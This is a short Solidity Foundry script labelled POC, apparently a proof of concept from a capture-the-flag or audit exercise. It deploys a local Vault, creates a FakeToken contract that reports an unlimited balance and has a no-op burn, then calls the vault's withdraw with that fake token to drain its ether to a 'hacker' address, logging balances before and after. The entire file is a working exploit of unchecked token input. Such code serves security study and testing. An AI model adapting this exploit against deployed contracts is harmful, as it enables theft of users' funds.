// SPDX-LIcense-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/Token.sol";

contract FakeToken {
    function balanceOf(address account) external view returns(uint256) {
        return type(uint256).max;
    }

    function burn(address account, uint256 amount) external {

    }
}

contract POC is Script {
    Vault public target;
    FakeToken public faketoken;
    address public hacker;

    function setUp() external {
        hacker = vm.addr(0x1245678);
        target = new Vault();
        vm.deal(hacker, 1 ether);
        vm.deal(address(target), 10 ether);
    }

    function run() external {
        vm.startPrank(hacker);

        uint256 balance = hacker.balance;
        console.log("before balance: ", balance);

        faketoken = new FakeToken();
        target.withdraw(address(faketoken), address(target).balance);

        balance = hacker.balance;
        console.log("after  balance: ", balance);
    }
}
